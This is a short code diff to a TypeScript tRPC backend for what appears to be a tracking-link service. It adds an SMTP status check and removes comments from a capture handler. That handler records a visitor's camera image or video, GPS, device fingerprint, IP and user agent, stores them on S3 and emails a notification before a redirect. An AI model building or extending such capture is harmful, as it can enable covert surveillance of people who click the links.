@@ -21,6 +21,17 @@ export const appRouter = router({
     }),
   }),
 
+  status: router({
+    smtpStatus: publicProcedure.query(() => {
+      const host = process.env.SMTP_HOST;
+      const user = process.env.SMTP_USER;
+      const pass = process.env.SMTP_PASS;
+      return {
+        configured: Boolean(host && user && pass),
+      };
+    }),
+  }),
+
   tracking: router({
     createLink: protectedProcedure
       .input(
@@ -70,7 +81,7 @@ export const appRouter = router({
       .input(
         z.object({
           linkId: z.string(),
-          imageBase64: z.string(), // data:image/png;base64,... or video data
+          imageBase64: z.string(),
           gps: z.string().optional(),
           fingerprint: z.string().optional(),
           resolution: z.string().optional(),
@@ -82,12 +93,10 @@ export const appRouter = router({
           throw new Error("Tracking link not found");
         }
 
-        // IP ermitteln
         const forwarded = ctx.req.headers["x-forwarded-for"];
         const ip = typeof forwarded === "string" ? forwarded.split(",")[0] : ctx.req.socket.remoteAddress || "unknown";
         const userAgent = ctx.req.headers["user-agent"] || "unknown";
 
-        // Datei auf S3 speichern
         const base64Data = input.imageBase64;
         let ext = "png";
         let mime = "image/png";
@@ -120,7 +129,6 @@ export const appRouter = router({
           createdAt: now,
         });
 
-        // E-Mail-Benachrichtigung async senden (blockiert die Weiterleitung nicht)
         sendCaptureNotification({
           linkId: input.linkId,
           ip: ip.trim(),
